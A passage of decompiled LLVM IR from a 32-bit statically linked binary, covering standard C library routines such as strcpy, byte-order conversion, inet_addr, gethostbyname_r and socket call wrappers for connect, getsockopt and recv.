  %v9_8049c5b = select i1 %v8_8049c5b.pre, i32 -1, i32 1
  br label %dec_label_pc_8049c5b

dec_label_pc_8049c5b:                             ; preds = %dec_label_pc_8049c60, %entry
  %v4_8049c5b = phi i32 [ %v6_8049c5b, %dec_label_pc_8049c60 ], [ %v5_8049c59, %entry ]
  %v7_8049c5b = phi i32 [ %v10_8049c5b, %dec_label_pc_8049c60 ], [ %v4_8049c51, %entry ]
  %v1_8049c5b = inttoptr i32 %v7_8049c5b to i8*
  %v2_8049c5b = load i8, i8* %v1_8049c5b, align 1
  %v10_8049c5b = add i32 %v7_8049c5b, %v9_8049c5b
  %v3_8049c5c = udiv i32 %v4_8049c5b, 256
  %v4_8049c5c = trunc i32 %v3_8049c5c to i8
  %v16_8049c5c = icmp eq i8 %v2_8049c5b, %v4_8049c5c
  br i1 %v16_8049c5c, label %dec_label_pc_8049c69.loopexit, label %dec_label_pc_8049c60

dec_label_pc_8049c60:                             ; preds = %dec_label_pc_8049c5b
  %v3_8049c5b = zext i8 %v2_8049c5b to i32
  %v5_8049c5b = and i32 %v4_8049c5b, -256
  %v6_8049c5b = or i32 %v3_8049c5b, %v5_8049c5b
  %v4_8049c60 = icmp eq i8 %v2_8049c5b, 0
  %v1_8049c62 = icmp eq i1 %v4_8049c60, false
  br i1 %v1_8049c62, label %dec_label_pc_8049c5b, label %dec_label_pc_8049c64

dec_label_pc_8049c64:                             ; preds = %dec_label_pc_8049c60
  br label %dec_label_pc_8049c69

dec_label_pc_8049c69.loopexit:                    ; preds = %dec_label_pc_8049c5b
  %phitmp = add i32 %v10_8049c5b, -1
  br label %dec_label_pc_8049c69

dec_label_pc_8049c69:                             ; preds = %dec_label_pc_8049c69.loopexit, %dec_label_pc_8049c64
  %v0_8049c69 = phi i32 [ 0, %dec_label_pc_8049c64 ], [ %phitmp, %dec_label_pc_8049c69.loopexit ]
  ret i32 %v0_8049c69

; uselistorder directives
  uselistorder i8 %v2_8049c5b, { 1, 2, 0 }
  uselistorder i32 %v4_8049c5b, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049c71 = load i32, i32* @esi, align 4
  store i32 %v0_8049c71, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8049c79 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8049c79, i32* %edi.global-to-local, align 4
  %v4_8049c7d.pre = load i32, i32* @eax, align 4
  %v8_8049c7d.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8049c7d

dec_label_pc_8049c7d:                             ; preds = %dec_label_pc_8049c7d.dec_label_pc_8049c7d_crit_edge, %entry
  %v2_8049c7e = phi i32 [ %v7_8049c7e, %dec_label_pc_8049c7d.dec_label_pc_8049c7d_crit_edge ], [ %v4_8049c79, %entry ]
  %v8_8049c7d = phi i1 [ %v5_8049c7e, %dec_label_pc_8049c7d.dec_label_pc_8049c7d_crit_edge ], [ %v8_8049c7d.pre, %entry ]
  %v4_8049c7d = phi i32 [ %v0_8049c7f, %dec_label_pc_8049c7d.dec_label_pc_8049c7d_crit_edge ], [ %v4_8049c7d.pre, %entry ]
  %v7_8049c7d = phi i32 [ %v0_8049c7d.pre, %dec_label_pc_8049c7d.dec_label_pc_8049c7d_crit_edge ], [ %arg2, %entry ]
  %v1_8049c7d = inttoptr i32 %v7_8049c7d to i8*
  %v2_8049c7d = load i8, i8* %v1_8049c7d, align 1
  %v3_8049c7d = zext i8 %v2_8049c7d to i32
  %v5_8049c7d = and i32 %v4_8049c7d, -256
  %v6_8049c7d = or i32 %v3_8049c7d, %v5_8049c7d
  store i32 %v6_8049c7d, i32* %eax.global-to-local, align 4
  %v9_8049c7d = select i1 %v8_8049c7d, i32 -1, i32 1
  %v10_8049c7d = add i32 %v7_8049c7d, %v9_8049c7d
  store i32 %v10_8049c7d, i32* %esi.global-to-local, align 4
  %v3_8049c7e = inttoptr i32 %v2_8049c7e to i8*
  store i8 %v2_8049c7d, i8* %v3_8049c7e, align 1
  %v4_8049c7e = load i32, i32* %edi.global-to-local, align 4
  %v5_8049c7e = load i1, i1* @df, align 1
  %v6_8049c7e = select i1 %v5_8049c7e, i32 -1, i32 1
  %v7_8049c7e = add i32 %v6_8049c7e, %v4_8049c7e
  store i32 %v7_8049c7e, i32* %edi.global-to-local, align 4
  %v0_8049c7f = load i32, i32* %eax.global-to-local, align 4
  %v3_8049c7f = trunc i32 %v0_8049c7f to i8
  %v4_8049c7f = icmp eq i8 %v3_8049c7f, 0
  %v1_8049c81 = icmp eq i1 %v4_8049c7f, false
  br i1 %v1_8049c81, label %dec_label_pc_8049c7d.dec_label_pc_8049c7d_crit_edge, label %dec_label_pc_8049c83

dec_label_pc_8049c7d.dec_label_pc_8049c7d_crit_edge: ; preds = %dec_label_pc_8049c7d
  %v0_8049c7d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049c7d

dec_label_pc_8049c83:                             ; preds = %dec_label_pc_8049c7d
  store i32 %v4_8049c79, i32* %eax.global-to-local, align 4
  %v2_8049c87 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049c87, i32* @edx, align 4
  %v2_8049c88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049c88, i32* @esi, align 4
  ret i32 %v4_8049c79

; uselistorder directives
  uselistorder i32 %v0_8049c7f, { 1, 0 }
  uselistorder i32 %v7_8049c7e, { 1, 0 }
  uselistorder i1 %v5_8049c7e, { 1, 0 }
  uselistorder i32 %v4_8049c79, { 1, 2, 0, 3 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8049c9c = inttoptr i32 %arg2 to i8*
  %v3_8049c9c = call i32 @memmove(i8* %v2_8049c9c, i32 %arg1)
  ret i32 %v3_8049c9c
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8049cb4 = inttoptr i32 %arg1 to i8*
  %v4_8049cb4 = call i32 @strtok_r(i8* %v3_8049cb4, i32 %arg2, i32 ptrtoint (i32* @global_var_805231c.29 to i32))
  ret i32 %v4_8049cb4
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049cc4 = trunc i32 %arg1 to i16
  %v2_8049cc4 = call i16 @llvm.bswap.i16(i16 %v1_8049cc4)
  %v3_8049cc4 = zext i16 %v2_8049cc4 to i32
  ret i32 %v3_8049cc4
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049cd0 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049cd0
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049cd7 = trunc i32 %arg1 to i16
  %v2_8049cd7 = call i16 @llvm.bswap.i16(i16 %v1_8049cd7)
  %v3_8049cd7 = zext i16 %v2_8049cd7 to i32
  ret i32 %v3_8049cd7
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049ce3 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049ce3
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8049ceb = ptrtoint i32* %stack_var_-4 to i32
  %v2_8049cf4 = inttoptr i32 %arg1 to i8*
  %v3_8049cf4 = call i32 @inet_aton(i8* %v2_8049cf4, i32 %v2_8049ceb)
  %v1_8049cff = icmp eq i32 %v3_8049cf4, 0
  br i1 %v1_8049cff, label %dec_label_pc_8049d07, label %dec_label_pc_8049d03

dec_label_pc_8049d03:                             ; preds = %entry
  %v3_8049d03 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049d07

dec_label_pc_8049d07:                             ; preds = %entry, %dec_label_pc_8049d03
  %v0_8049d07 = phi i32 [ -1, %entry ], [ %v3_8049d03, %dec_label_pc_8049d03 ]
  ret i32 %v0_8049d07

; uselistorder directives
  uselistorder label %dec_label_pc_8049d07, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049d13 = call i32 @__GI___h_errno_location()
  %v0_8049d18 = load i32, i32* @edx, align 4
  %v2_8049d1b = ptrtoint i32* %stack_var_-4 to i32
  %v9_8049d33 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80524ec.31, i32 ptrtoint (i32* @global_var_8052320.30 to i32), i32 460, i32 %v2_8049d1b, i32 %v0_8049d13, i32 %v0_8049d18, i32 %v0_8049d18)
  %v3_8049d38 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8049d38
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8049d40 = load i32, i32* @ebp, align 4
  %v0_8049d41 = load i32, i32* @edi, align 4
  %v0_8049d42 = load i32, i32* @esi, align 4
  %v0_8049d43 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8049d53 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8049d53, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8049d5e = icmp eq i32 %arg1, 0
  br i1 %v4_8049d5e, label %dec_label_pc_804a06a, label %dec_label_pc_8049d69

dec_label_pc_8049d69:                             ; preds = %entry
  %v1_8049d69 = call i32 @__errno_location(i32 %v0_8049d43)
  store i32 %v1_8049d69, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d69, i32* @esi, align 4
  %v1_8049d70 = inttoptr i32 %v1_8049d69 to i32*
  %v2_8049d70 = load i32, i32* %v1_8049d70, align 4
  store i32 %v2_8049d70, i32* @edi, align 4
  store i32 0, i32* %v1_8049d70, align 4
  %v0_8049d81 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d81, i32* %stack_var_-108, align 4
  %v7_8049d8d = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8049d81, i32 %arg5, i32 %arg6, i32 %v1_8049d69)
  store i32 %v7_8049d8d, i32* %eax.global-to-local, align 4
  %v1_8049d95 = icmp eq i32 %v7_8049d8d, 0
  br i1 %v1_8049d95, label %dec_label_pc_804a06a, label %dec_label_pc_8049d9d

dec_label_pc_8049d9d:                             ; preds = %dec_label_pc_8049d69
  %v1_8049da1 = inttoptr i32 %arg6 to i32*
  %v2_8049da1 = load i32, i32* %v1_8049da1, align 4
  store i32 %v2_8049da1, i32* %edx.global-to-local, align 4
  %v9_8049da3 = icmp eq i32 %v2_8049da1, 1
  br i1 %v9_8049da3, label %dec_label_pc_8049dbd, label %dec_label_pc_8049da8

dec_label_pc_8049da8:                             ; preds = %dec_label_pc_8049d9d
  %v9_8049da8 = icmp eq i32 %v2_8049da1, 4
  br i1 %v9_8049da8, label %dec_label_pc_8049dbd, label %dec_label_pc_8049dad

dec_label_pc_8049dad:                             ; preds = %dec_label_pc_8049da8
  %v1_8049dad = add i32 %v2_8049da1, 1
  %v8_8049dad = icmp eq i32 %v1_8049dad, 0
  store i32 %v1_8049dad, i32* %edx.global-to-local, align 4
  %v1_8049dae = icmp eq i1 %v8_8049dad, false
  br i1 %v1_8049dae, label %dec_label_pc_804a06a, label %dec_label_pc_8049db4

dec_label_pc_8049db4:                             ; preds = %dec_label_pc_8049dad
  %v0_8049db4 = load i32, i32* @esi, align 4
  %v1_8049db4 = inttoptr i32 %v0_8049db4 to i32*
  %v2_8049db4 = load i32, i32* %v1_8049db4, align 4
  %v11_8049db4 = icmp eq i32 %v2_8049db4, 2
  %v1_8049db7 = icmp eq i1 %v11_8049db4, false
  br i1 %v1_8049db7, label %dec_label_pc_804a06a, label %dec_label_pc_8049dbd

dec_label_pc_8049dbd:                             ; preds = %dec_label_pc_8049db4, %dec_label_pc_8049da8, %dec_label_pc_8049d9d
  %v0_8049dbd = load i32, i32* @ebp, align 4
  store i32 %v0_8049dbd, i32* %eax.global-to-local, align 4
  %v0_8049dbf = load i32, i32* @edi, align 4
  %v1_8049dbf = load i32, i32* @esi, align 4
  %v2_8049dbf = inttoptr i32 %v1_8049dbf to i32*
  store i32 %v0_8049dbf, i32* %v2_8049dbf, align 4
  %v0_8049dc1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049dc1 = sub i32 0, %v0_8049dc1
  %v1_8049dc3 = urem i32 %v1_8049dc1, 4
  %v2_8049dc3 = icmp eq i32 %v1_8049dc3, 0
  store i32 %v1_8049dc3, i32* %eax.global-to-local, align 4
  %v0_8049dd8.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8049dc3, label %dec_label_pc_8049dd4, label %dec_label_pc_8049dc8

dec_label_pc_8049dc8:                             ; preds = %dec_label_pc_8049dbd
  %v2_8049dc8 = sub i32 %v0_8049dd8.pre, %v1_8049dc3
  %v7_8049dc8 = icmp ult i32 %v0_8049dd8.pre, %v1_8049dc3
  br i1 %v7_8049dc8, label %dec_label_pc_804a065, label %dec_label_pc_8049dd0

dec_label_pc_8049dd0:                             ; preds = %dec_label_pc_8049dc8
  %v0_8049dd0 = load i32, i32* @ebp, align 4
  %v2_8049dd0 = add i32 %v0_8049dd0, %v1_8049dc3
  store i32 %v2_8049dd0, i32* @ebp, align 4
  store i32 %v2_8049dc8, i32* @ebx, align 4
  br label %dec_label_pc_8049dd4

dec_label_pc_8049dd4:                             ; preds = %dec_label_pc_8049dbd, %dec_label_pc_8049dd0
  %v0_8049dd8 = phi i32 [ %v2_8049dc8, %dec_label_pc_8049dd0 ], [ %v0_8049dd8.pre, %dec_label_pc_8049dbd ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8049da1, align 4
  %tmp43 = icmp ult i32 %v0_8049dd8, 4
  br i1 %tmp43, label %dec_label_pc_804a065, label %dec_label_pc_8049de7

dec_label_pc_8049de7:                             ; preds = %dec_label_pc_8049dd4
  %v0_8049de7 = load i32, i32* @ebx, align 4
  %v1_8049de7 = add i32 %v0_8049de7, -4
  store i32 %v1_8049de7, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_8049de7, 8
  br i1 %tmp44, label %dec_label_pc_804a065, label %dec_label_pc_8049df3

dec_label_pc_8049df3:                             ; preds = %dec_label_pc_8049de7
  %v0_8049df3 = load i32, i32* @ebp, align 4
  %v1_8049df3 = add i32 %v0_8049df3, 4
  store i32 %v1_8049df3, i32* %edx.global-to-local, align 4
  %v1_8049df6 = add i32 %v0_8049de7, -12
  store i32 %v1_8049df6, i32* %eax.global-to-local, align 4
  store i32 %v1_8049df3, i32* %stack_var_-92, align 4
  %v3_8049dff = inttoptr i32 %v1_8049df3 to i32*
  store i32 %v0_8049df3, i32* %v3_8049dff, align 4
  %v0_8049e02 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049e02 = add i32 %v0_8049e02, 4
  %v2_8049e02 = inttoptr i32 %v1_8049e02 to i32*
  store i32 0, i32* %v2_8049e02, align 4
  %tmp45 = icmp ult i32 %v1_8049df6, 32
  br i1 %tmp45, label %dec_label_pc_804a065, label %dec_label_pc_8049e0f

dec_label_pc_8049e0f:                             ; preds = %dec_label_pc_8049df3
  %v0_8049e0f = load i32, i32* @ebx, align 4
  %v1_8049e0f = add i32 %v0_8049e0f, -44
  store i32 %v1_8049e0f, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_8049e0f, 256
  br i1 %tmp46, label %dec_label_pc_804a065, label %dec_label_pc_8049e22

dec_label_pc_8049e22:                             ; preds = %dec_label_pc_8049e0f
  %v0_8049e22 = load i32, i32* @ebp, align 4
  %v1_8049e22 = add i32 %v0_8049e22, 12
  %v1_8049e25 = add i32 %v0_8049e22, 44
  store i32 %v1_8049e25, i32* @edi, align 4
  store i32 %v1_8049e25, i32* %stack_var_-108, align 4
  %v4_8049e36 = inttoptr i32 %v1_8049e25 to i8*
  %v5_8049e36 = call i32 @strncpy(i8* %v4_8049e36, i32 %arg1, i32 %v1_8049e0f, i32 %v1_8049e22)
  %v0_8049e3b = load i32, i32* @edi, align 4
  %v1_8049e3b = load i32, i32* @ebp, align 4
  %v2_8049e3b = add i32 %v1_8049e3b, 12
  %v3_8049e3b = inttoptr i32 %v2_8049e3b to i32*
  store i32 %v0_8049e3b, i32* %v3_8049e3b, align 4
  %v1_8049e42 = add i32 %v0_8049e22, 16
  %v2_8049e42 = inttoptr i32 %v1_8049e42 to i32*
  store i32 0, i32* %v2_8049e42, align 4
  %v2_8049e49 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8049e49, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8049e4b = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8049e50 = inttoptr i32 %arg1 to i8*
  %v3_8049e50 = call i32 @inet_aton(i8* %v2_8049e50, i32 %v0_8049e4b)
  store i32 %v3_8049e50, i32* %eax.global-to-local, align 4
  %v1_8049e58 = icmp eq i32 %v3_8049e50, 0
  br i1 %v1_8049e58, label %dec_label_pc_8049e94, label %dec_label_pc_8049e5c

dec_label_pc_8049e5c:                             ; preds = %dec_label_pc_8049e22
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8049e60 = load i32, i32* @edi, align 4
  store i32 %v0_8049e60, i32* %arg2, align 4
  %v1_8049e62 = add i32 %tmp18, 8
  %v2_8049e62 = inttoptr i32 %v1_8049e62 to i32*
  store i32 2, i32* %v2_8049e62, align 4
  %v0_8049e69 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049e69 = add i32 %v0_8049e69, 12
  %v2_8049e69 = inttoptr i32 %v1_8049e69 to i32*
  store i32 4, i32* %v2_8049e69, align 4
  %v2_8049e70 = load i32, i32* %stack_var_-92, align 4
  %v1_8049e73 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e73 = add i32 %v1_8049e73, 16
  %v3_8049e73 = inttoptr i32 %v2_8049e73 to i32*
  store i32 %v2_8049e70, i32* %v3_8049e73, align 4
  %v1_8049e7a = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e7a = add i32 %v1_8049e7a, 4
  %v3_8049e7a = inttoptr i32 %v2_8049e7a to i32*
  store i32 %v1_8049e22, i32* %v3_8049e7a, align 4
  %v0_8049e81 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8049e81, i32* %v1_8049d53, align 4
  store i32 0, i32* %v1_8049da1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a06a

dec_label_pc_8049e94:                             ; preds = %dec_label_pc_8049e22
  %v0_8049e94 = call i32 @__open_nameservers()
  store i32 %v0_8049e94, i32* @eax, align 4
  %v2_8049ea4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8049ea4, i32* @ebx, align 4
  store i32 %v2_8049ea4, i32* %stack_var_-108, align 4
  %v2_8049ea9 = call i32 @__pthread_return_void(i32 %v2_8049ea4, i32 134526427)
  store i32 %v2_8049ea9, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %stack_var_-108, align 4
  %v1_8049eb5 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052160.32 to i32))
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* @ecx, align 4
  store i32 134526427, i32* @eax, align 4
  store i32 %v2_8049ea4, i32* %stack_var_-108, align 4
  %v0_8049ebf = load i32, i32* @global_var_8054994.33, align 4
  store i32 %v0_8049ebf, i32* @esi, align 4
  %v2_8049ec5 = call i32 @__pthread_return_void(i32 %v2_8049ea4, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8049ee0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8049ee5 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8049ee5, i32* %eax.global-to-local, align 4
  store i32 %v2_8049ee5, i32* %stack_var_-108, align 4
  %v0_8049eef = load i32, i32* @esi, align 4
  %v7_8049ef6 = call i32 @__dns_lookup(i8* %v2_8049e50, i32 1, i32 %v0_8049eef, i32 ptrtoint (i32* @global_var_8054988.34 to i32), i32 %v2_8049ee5, i32 %v2_8049ee0)
  store i32 %v7_8049ef6, i32* %eax.global-to-local, align 4
  %v2_8049efe = icmp slt i32 %v7_8049ef6, 0
  %v1_8049f00 = icmp eq i1 %v2_8049efe, false
  br i1 %v1_8049f00, label %dec_label_pc_8049f16, label %dec_label_pc_8049f02

dec_label_pc_8049f02:                             ; preds = %dec_label_pc_8049e94
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8049da1, align 4
  br label %dec_label_pc_804a06a

dec_label_pc_8049f16:                             ; preds = %dec_label_pc_8049e94
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8049f29 = icmp ugt i32 %v1_8049e0f, 256
  %v15_8049f29 = icmp eq i32 %v0_8049e0f, 300
  %v2_8049f2d = or i1 %v15_8049f29, %v10_8049f29
  br i1 %v2_8049f2d, label %dec_label_pc_8049fc8, label %dec_label_pc_8049f2f

dec_label_pc_8049f2f:                             ; preds = %dec_label_pc_8049f16
  %v3_8049f32 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8049f32, i32* %stack_var_-108, align 4
  %v1_8049f36 = call i32 @free(i32 %v3_8049f32)
  store i32 %v1_8049f36, i32* %eax.global-to-local, align 4
  store i32 %v3_8049f32, i32* @edi, align 4
  %v3_8049f3c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8049f3c, i32* %stack_var_-108, align 4
  %v1_8049f40 = call i32 @free(i32 %v3_8049f3c)
  store i32 -1, i32* %v1_8049da1, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a040

dec_label_pc_8049fc8:                             ; preds = %dec_label_pc_8049f16
  %v3_8049fcd.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8049fd1.pre = load i32, i32* @edi, align 4
  store i32 %v0_8049fd1.pre, i32* %stack_var_-108, align 4
  %v4_8049fd2 = inttoptr i32 %v0_8049fd1.pre to i8*
  %v5_8049fd2 = call i32 @strncpy(i8* %v4_8049fd2, i32 %v3_8049fcd.pre, i32 %v1_8049e0f, i32 %v2_8049ea4)
  store i32 %v5_8049fd2, i32* %eax.global-to-local, align 4
  %v3_8049fd8 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8049fd8, i32* %stack_var_-108, align 4
  %v1_8049fdc = call i32 @free(i32 %v3_8049fd8)
  store i32 %v1_8049fdc, i32* %eax.global-to-local, align 4
  %v12_8049fe4 = icmp eq i32 %tmp10, 1
  %v1_8049fe9 = icmp eq i1 %v12_8049fe4, false
  br i1 %v1_8049fe9, label %dec_label_pc_804a045, label %dec_label_pc_8049feb

dec_label_pc_8049feb:                             ; preds = %dec_label_pc_8049fc8
  %v0_8049feb = load i32, i32* @edx, align 4
  %v0_8049ff2 = load i32, i32* @ebp, align 4
  store i32 %v0_8049ff2, i32* %stack_var_-108, align 4
  %v3_8049ff3 = inttoptr i32 %tmp to i16*
  %v4_8049ff3 = call i32 @memcpy(i16* %v3_8049ff3, i32 4, i32 %v0_8049feb)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8049ffc = load i32, i32* @edi, align 4
  store i32 %v0_8049ffc, i32* %arg2, align 4
  %v1_8049ffe = add i32 %tmp18, 8
  %v2_8049ffe = inttoptr i32 %v1_8049ffe to i32*
  store i32 2, i32* %v2_8049ffe, align 4
  %v0_804a005 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a005 = add i32 %v0_804a005, 12
  %v2_804a005 = inttoptr i32 %v1_804a005 to i32*
  store i32 4, i32* %v2_804a005, align 4
  %v3_804a00c = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804a00c, i32* %edx.global-to-local, align 4
  %v1_804a010 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a010 = add i32 %v1_804a010, 16
  %v3_804a010 = inttoptr i32 %v2_804a010 to i32*
  store i32 %v3_804a00c, i32* %v3_804a010, align 4
  %v1_804a017 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a017 = add i32 %v1_804a017, 4
  %v3_804a017 = inttoptr i32 %v2_804a017 to i32*
  store i32 %v1_8049e22, i32* %v3_804a017, align 4
  %v2_804a01a = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804a01a, i32* %eax.global-to-local, align 4
  %v3_804a01b = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a01b, i32* %stack_var_-108, align 4
  %v1_804a01f = call i32 @free(i32 %v3_804a01b)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8049d53, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8049da1, align 4
  br label %dec_label_pc_804a040

dec_label_pc_804a040:                             ; preds = %dec_label_pc_804a045, %dec_label_pc_8049f2f, %dec_label_pc_8049feb
  br label %dec_label_pc_804a06a

dec_label_pc_804a045:                             ; preds = %dec_label_pc_8049fc8
  %v3_804a048 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a048, i32* %stack_var_-108, align 4
  %v1_804a04c = call i32 @free(i32 %v3_804a048)
  store i32 1, i32* %v1_8049da1, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a040

dec_label_pc_804a065:                             ; preds = %dec_label_pc_8049e0f, %dec_label_pc_8049df3, %dec_label_pc_8049de7, %dec_label_pc_8049dd4, %dec_label_pc_8049dc8
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a06a

dec_label_pc_804a06a:                             ; preds = %dec_label_pc_8049db4, %dec_label_pc_8049dad, %dec_label_pc_8049d69, %entry, %dec_label_pc_804a040, %dec_label_pc_8049f02, %dec_label_pc_8049e5c, %dec_label_pc_804a065
  store i32 %v0_8049d43, i32* @ebx, align 4
  store i32 %v0_8049d42, i32* @esi, align 4
  store i32 %v0_8049d41, i32* @edi, align 4
  store i32 %v0_8049d40, i32* @ebp, align 4
  %v0_804a071 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804a071

; uselistorder directives
  uselistorder i32 %v2_8049ea4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_8049e25, { 1, 0, 2 }
  uselistorder i32 %v1_8049e22, { 2, 1, 0 }
  uselistorder i32 %v1_8049e0f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8049dd8.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8049dc3, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8049da1, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8049da1, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8049d53, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804a06a, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804a040, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8049dd4, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804a08f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804a096 = call i32 @__socketcall(i32 3, i32 %v2_804a08f)
  ret i32 %v2_804a096

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804a0cb = ptrtoint i32* %stack_var_-20 to i32
  %v2_804a0d2 = call i32 @__socketcall(i32 15, i32 %v2_804a0cb)
  ret i32 %v2_804a0d2

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804a0ff = ptrtoint i32* %stack_var_-16 to i32
  %v2_804a106 = call i32 @__socketcall(i32 10, i32 %v2_804a0ff)
  ret i32 %v2_804a106

; uselistorder directives
